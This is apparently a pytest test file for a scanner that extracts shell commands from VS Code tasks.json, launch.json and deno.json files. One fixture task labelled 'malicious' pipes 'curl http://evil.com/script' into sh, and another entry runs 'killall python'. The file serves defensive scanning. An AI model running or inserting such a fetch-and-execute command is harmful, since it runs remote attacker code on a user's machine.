import pytest
import json
from gptscan import unpack_content, Config

def test_tasks_json_extraction():
    content = b"""
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "echo",
            "type": "shell",
            "command": "echo Hello"
        },
        {
            "label": "malicious",
            "type": "shell",
            "command": "curl http://evil.com/script | sh",
            "args": ["--silent"]
        }
    ],
    "inputs": [
        {
            "id": "terminate",
            "type": "command",
            "command": "shellCommand.execute",
            "args": ["killall python"]
        }
    ]
}
"""
    results = list(unpack_content("tasks.json", content))
    scripts = {s[0]: s[1].decode() for s in results}

    assert "tasks.json [Task: echo]" in scripts
    assert scripts["tasks.json [Task: echo]"] == "echo Hello"

    assert "tasks.json [Task: malicious]" in scripts
    assert scripts["tasks.json [Task: malicious]"] == "curl http://evil.com/script | sh --silent"

    assert "tasks.json [Input Command: terminate]" in scripts
    assert scripts["tasks.json [Input Command: terminate]"] == "shellCommand.execute"

def test_tasks_json_with_comments():
    content = b"""
{
    // This is a comment
    "version": "2.0.0",
    "tasks": [
        {
            "label": "test",
            /* Multi-line
               comment */
            "command": "pytest" // another comment
        }
    ]
}
"""
    results = list(unpack_content("tasks.json", content))
    scripts = {s[0]: s[1].decode() for s in results}

    assert "tasks.json [Task: test]" in scripts
    assert scripts["tasks.json [Task: test]"] == "pytest"

def test_launch_json_extraction():
    content = b"""
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python: Current File",
            "type": "python",
            "request": "launch",
            "program": "${file}",
            "args": ["--debug", "val"],
            "preLaunchTask": "build-step"
        }
    ]
}
"""
    results = list(unpack_content("launch.json", content))
    scripts = {s[0]: s[1].decode() for s in results}

    assert "launch.json [Launch: Python: Current File]" in scripts
    assert scripts["launch.json [Launch: Python: Current File]"] == "${file} --debug val"

    assert "launch.json [PreLaunchTask: Python: Current File]" in scripts
    assert scripts["launch.json [PreLaunchTask: Python: Current File]"] == "build-step"

def test_deno_json_with_comments():
    content = b"""
{
    "tasks": {
        // Run the dev server
        "dev": "deno run -A main.ts"
    }
}
"""
    results = list(unpack_content("deno.json", content))
    scripts = {s[0]: s[1].decode() for s in results}

    assert "deno.json [Task: dev]" in scripts
    assert scripts["deno.json [Task: dev]"] == "deno run -A main.ts"

def test_is_container_vscode():
    assert Config.is_container("tasks.json") is True
    assert Config.is_container(".vscode/launch.json") is True
    assert Config.is_container("path/to/tasks.json") is True
